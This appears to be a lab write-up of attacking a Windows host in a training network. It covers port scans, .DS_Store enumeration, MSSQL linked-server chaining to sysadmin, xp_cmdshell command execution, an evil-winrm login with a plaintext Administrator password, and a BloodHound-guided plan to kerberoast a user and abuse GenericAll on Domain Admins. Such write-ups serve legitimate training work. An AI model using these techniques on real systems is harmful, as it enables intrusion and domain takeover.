# Nmap
```shell
nmap -A 10.13.38.11                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 06:35 EDT
Nmap scan report for 10.13.38.11
Host is up (0.017s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2027.00; RTM+
|_ssl-date: 2024-04-18T10:36:58+00:00; +1m07s from scanner time.
| ms-sql-ntlm-info: 
|   10.13.38.11:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-04-18T02:20:46
|_Not valid after:  2054-04-18T02:20:46
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2027.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433

```

# Nikto
```shell
nikto -url 10.13.38.11
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.13.38.11
+ Target Hostname:    10.13.38.11
+ Target Port:        80
+ Start Time:         2024-04-18 06:53:53 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1446
+ 8254 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-04-18 06:57:29 (GMT-4) (216 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

The .DS_Store File is interesting. I used a python tool from [here](https://github.com/gehaxelt/Python-dsstore.git )
```shell
python main.py ../Untitled.DS_Store 
Count:  38
admin
admin
admin
dev
dev
dev
iisstart.htm
Images
Images
Images
JS
JS
JS
META-INF
META-INF
META-INF
New folder
New folder
New folder
New folder (2)
New folder (2)
New folder (2)
Plugins
Plugins
Plugins
Templates
Templates
Templates
Themes
Themes
Themes
Uploads
Uploads
Uploads
web.config
Widgets
Widgets
Widgets

```
# DS Walk
A better tool that will search recursively through ever directory
```shell
python3 ds_walk.py -u http://10.13.38.11/
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
----------------------------
[!] http://10.13.38.11//admin
[!] http://10.13.38.11//dev
[!] http://10.13.38.11//iisstart.htm
[!] http://10.13.38.11//Images
[!] http://10.13.38.11//JS
[!] http://10.13.38.11//META-INF
[!] http://10.13.38.11//New folder
[!] http://10.13.38.11//New folder (2)
[!] http://10.13.38.11//Plugins
[!] http://10.13.38.11//Templates
[!] http://10.13.38.11//Themes
[!] http://10.13.38.11//Uploads
[!] http://10.13.38.11//web.config
[!] http://10.13.38.11//Widgets
----------------------------
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/src
----------------------------
[!] http://10.13.38.11//Images/buttons
[!] http://10.13.38.11//Images/icons
[!] http://10.13.38.11//Images/iisstart.png
----------------------------
[!] http://10.13.38.11//JS/custom
----------------------------
[!] http://10.13.38.11//Themes/default
----------------------------
[!] http://10.13.38.11//Widgets/CalendarEvents
[!] http://10.13.38.11//Widgets/Framework
[!] http://10.13.38.11//Widgets/Menu
[!] http://10.13.38.11//Widgets/Notifications
----------------------------
[!] http://10.13.38.11//Widgets/Framework/Layouts
----------------------------
[!] http://10.13.38.11//Widgets/Framework/Layouts/custom
[!] http://10.13.38.11//Widgets/Framework/Layouts/default
----------------------------
[*] Finished traversing. No remaining .ds_store files present.
[*] Cleaning up .ds_store files saved to disk.

```


# MSSQL
## Users
```sql
SQL (external_user  external_user@master)> SELECT * FROM sys.database_principals;
name                 principal_id   type   type_desc       default_schema_name   create_date   modify_date   owning_principal_id                                                           sid   is_fixed_role   authentication_type   authentication_type_desc   default_language_name   default_language_lcid   allow_encrypted_value_modifications   
------------------   ------------   ----   -------------   -------------------   -----------   -----------   -------------------   -----------------------------------------------------------   -------------   -------------------   ------------------------   ---------------------   ---------------------   -----------------------------------   
public                          0   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'010500000000000904000000fb01993b66f9c34dbd9b2735f4cc0c93'               0                     0   NONE                       NULL                                     NULL                                     0   

dbo                             1   b'S'   SQL_USER        dbo                   2003-04-08 09:10:19   2003-04-08 09:10:19                  NULL                                                         b'01'               0                     1   INSTANCE                   NULL                                     NULL                                     0   

guest                           2   b'S'   SQL_USER        guest                 2003-04-08 09:10:19   2003-04-08 09:10:19                  NULL                                                         b'00'               0                     0   NONE                       NULL                                     NULL                                     0   

INFORMATION_SCHEMA              3   b'S'   SQL_USER        NULL                  2009-04-13 12:59:06   2009-04-13 12:59:06                  NULL                                                          NULL               0                     0   NONE                       NULL                                     NULL                                     0   

sys                             4   b'S'   SQL_USER        NULL                  2009-04-13 12:59:06   2009-04-13 12:59:06                  NULL                                                          NULL               0                     0   NONE                       NULL                                     NULL                                     0   

external_user                   7   b'S'   SQL_USER        dbo                   2018-03-17 13:49:31   2018-03-17 13:49:31                  NULL                           b'd57365b902765d41bc31e0c230f5af02'               0                     1   INSTANCE                   NULL                                     NULL                                     0   

db_owner                    16384   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'01050000000000090400000000000000000000000000000000400000'               1                     0   NONE                       NULL                                     NULL                                     0   

db_accessadmin              16385   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'01050000000000090400000000000000000000000000000001400000'               1                     0   NONE                       NULL                                     NULL                                     0   

db_securityadmin            16386   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'01050000000000090400000000000000000000000000000002400000'               1                     0   NONE                       NULL                                     NULL                                     0   

db_ddladmin                 16387   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'01050000000000090400000000000000000000000000000003400000'               1                     0   NONE                       NULL                                     NULL                                     0   

db_backupoperator           16389   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'01050000000000090400000000000000000000000000000005400000'               1                     0   NONE                       NULL                                     NULL                                     0   

db_datareader               16390   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'01050000000000090400000000000000000000000000000006400000'               1                     0   NONE                       NULL                                     NULL                                     0   

db_datawriter               16391   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'01050000000000090400000000000000000000000000000007400000'               1                     0   NONE                       NULL                                     NULL                                     0   

db_denydatareader           16392   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'01050000000000090400000000000000000000000000000008400000'               1                     0   NONE                       NULL                                     NULL                                     0   

db_denydatawriter           16393   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'01050000000000090400000000000000000000000000000009400000'               1                     0   NONE                       NULL                                     NULL                                     0   


```

## Finding sysadmin
```sql
select name, sysadmin from syslogins;
name   sysadmin   
----   --------   
sa            1   

```

## Linked Servers:
```sql
SQL (external_user  guest@master)> select srvname, isremote from sysservers;
srvname                    isremote   
------------------------   --------   
COMPATIBILITY\POO_PUBLIC          1   

COMPATIBILITY\POO_CONFIG          0   

```
The value 1 stands for remote server.
The value 0 stands for linked server.
So POO_Config is our target

```sql
SQL (external_user  external_user@master)> EXEC ('SELECT current_user') AT [COMPATIBILITY\POO_CONFIG];
                
-------------   
internal_user  

SQL (external_user  external_user@master)> EXEC ('SELECT @@servername') AT [COMPATIBILITY\POO_CONFIG];                           
------------------------   
COMPATIBILITY\POO_CONFIG 


SQL (external_user  external_user@master)> EXEC ('SELECT  name, sysadmin from syslogins') AT [COMPATIBILITY\POO_CONFIG];
name            sysadmin   
-------------   --------   
sa                     1   

internal_user          0   

SQL (external_user  external_user@master)> EXEC ('SELECT * from sys.database_principals') AT [COMPATIBILITY\POO_CONFIG];
name                 principal_id   type   type_desc       default_schema_name   create_date   modify_date   owning_principal_id                                                           sid   is_fixed_role   authentication_type   authentication_type_desc   default_language_name   default_language_lcid   allow_encrypted_value_modifications   
------------------   ------------   ----   -------------   -------------------   -----------   -----------   -------------------   -----------------------------------------------------------   -------------   -------------------   ------------------------   ---------------------   ---------------------   -----------------------------------   
public                          0   b'R'   DATABASE_ROLE   NULL                  2003-04-08 09:10:19   2009-04-13 12:59:10                     1   b'010500000000000904000000fb01993b66f9c34dbd9b2735f4cc0c93'               0                     0   NONE                       NULL                                     NULL                                     0   

dbo                             1   b'S'   SQL_USER        dbo                   2003-04-08 09:10:19   2003-04-08 09:10:19                  NULL                                                         b'01'               0                     1   INSTANCE                   NULL                                     NULL                                     0   

guest                           2   b'S'   SQL_USER        guest                 2003-04-08 09:10:19   2003-04-08 09:10:19                  NULL                                                         b'00'               0                     0   NONE                       NULL                                     NULL                                     0   

INFORMATION_SCHEMA              3   b'S'   SQL_USER        NULL                  2009-04-13 12:59:06   2009-04-13 12:59:06                  NULL                                                          NULL               0                     0   NONE                       NULL                                     NULL                                     0   

sys                             4   b'S'   SQL_USER        NULL                  2009-04-13 12:59:06   2009-04-13 12:59:06                  NULL                                                          NULL               0                     0   NONE                       NULL                                     NULL                                     0   

internal_user                   7   b'S'   SQL_USER        dbo                   2018-03-17 13:50:17   2018-03-17 13:50:17                  NULL                           b'4e6c9a727878684da065e7c29005704d'               0                     1   INSTANCE                   NULL                                     NULL                                     0   


```

# Linked -> Linked Server
So POO_CONFIG is linked to the first server we connect to and then POO_PUBLIC is linked to POO_CONFIG:
```sql
SQL (external_user  external_user@master)> EXEC ('select srvname, isremote FROM sysservers') AT [COMPATIBILITY\POO_CONFIG];
srvname                    isremote   
------------------------   --------   
COMPATIBILITY\POO_CONFIG          1   

COMPATIBILITY\POO_PUBLIC          0   



SQL (external_user  external_user@master)> EXEC ('EXEC (''SELECT USER_NAME();'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
      
---   
dbo   


EXEC ('EXEC (''SELECT name, sysadmin from syslogins;'') AT [COMPATIBILITY\POO_PUBLIC];') AT [COMPATIBILITY\POO_CONFIG];
name                                      sysadmin   
---------------------------------------   --------   
sa                                               1   

##MS_SQLResourceSigningCertificate##             0   

##MS_SQLReplicationSigningCertificate##          0   

##MS_SQLAuthenticatorCertificate##               0   

##MS_PolicySigningCertificate##                  0   

##MS_SmoExtendedSigningCertificate##             0   

##MS_PolicyTsqlExecutionLogin##                  0   

COMPATIBILITY\Administrator                      1   

NT SERVICE\SQLWriter                             1   

NT SERVICE\Winmgmt                               1   

NT Service\MSSQL$POO_PUBLIC                      1   

NT AUTHORITY\SYSTEM                              0   

NT SERVICE\SQLAgent$POO_PUBLIC                   1   

NT SERVICE\SQLTELEMETRY$POO_PUBLIC               0   

external_user                                    0   

##MS_PolicyEventProcessingLogin##                0   

##MS_AgentSigningCertificate##                   0



```

# Interesting Ports
Some interesting ports
```shell
QL (super  dbo@flag)> xp_cmdshell "netstat -ano"
output                                                                        
---------------------------------------------------------------------------   
NULL                                                                          

Active Connections                                                            

NULL                                                                          

  Proto  Local Address          Foreign Address        State           PID    

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912    

  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       4972   

  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:41433          0.0.0.0:0              LISTENING       4948   

  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4      

  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       488    

  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1152  
```

### Key Information from the `netstat` Output

1. **Listening Ports**:
    
    - `TCP 0.0.0.0:80`: HTTP server listening on all network interfaces.
    - `TCP 0.0.0.0:135`: Windows RPC.
    - `TCP 0.0.0.0:445`: Windows SMB/CIFS used for Windows file sharing.
    - `TCP 0.0.0.0:1433`: MSSQL server listening on all network interfaces.
    - `TCP 0.0.0.0:5985`: Windows Remote Management (WinRM) for HTTP.
    
    These are critical ports, each serving a specific function essential for various network services and administrative tasks.

So it is saying that those ports are open but the IPv4 address nmap scan never found them. Let us try to scan the IPv6 address
# Nmap IPv6 Scan
```
nmap -A -p- dead:beef::1001 -6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-19 11:01 EDT
Nmap scan report for dead:beef::1001
Host is up (0.030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Bad Request
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2027.00; RTM+
| ms-sql-ntlm-info: 
|   dead:beef::1001:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-04-19T02:21:34
|_Not valid after:  2054-04-19T02:21:34
|_ssl-date: 2024-04-19T15:05:45+00:00; +1m09s from scanner time.
| ms-sql-info: 
|   dead:beef::1001:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2027.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

# Winrm
So winrm is open. To help make tools easier to use give it a name in the etc/hosts file
```text
dead:beef::1001  poo
```
We can now connect with evil-winrm:
```shell
$ evil-winrm -i poo -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.' -P 5985

                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 


```

Let's enumerate the domain to find privilege escalation paths. We can't query the domain from a local administrator account. However, the SQL service account can be instead. Service accounts automatically impersonate the computer account, which are members of the domain and effectively a special type of user account.

# Bloodhound 

![[Pasted image 20240419164845.png]]![[Pasted image 20240419164904.png]]
![[Pasted image 20240419164924.png]]
# Shortest Path To DA from Kerb Users
![[Pasted image 20240419170327.png]]

The p00_adm user being a member of help desk has GenericAll privileges on the Domain Admins group. This means that we can add any user to Domain Admins if we have p00_adm credentials. Let's kerberoast this user and try to crack his hash.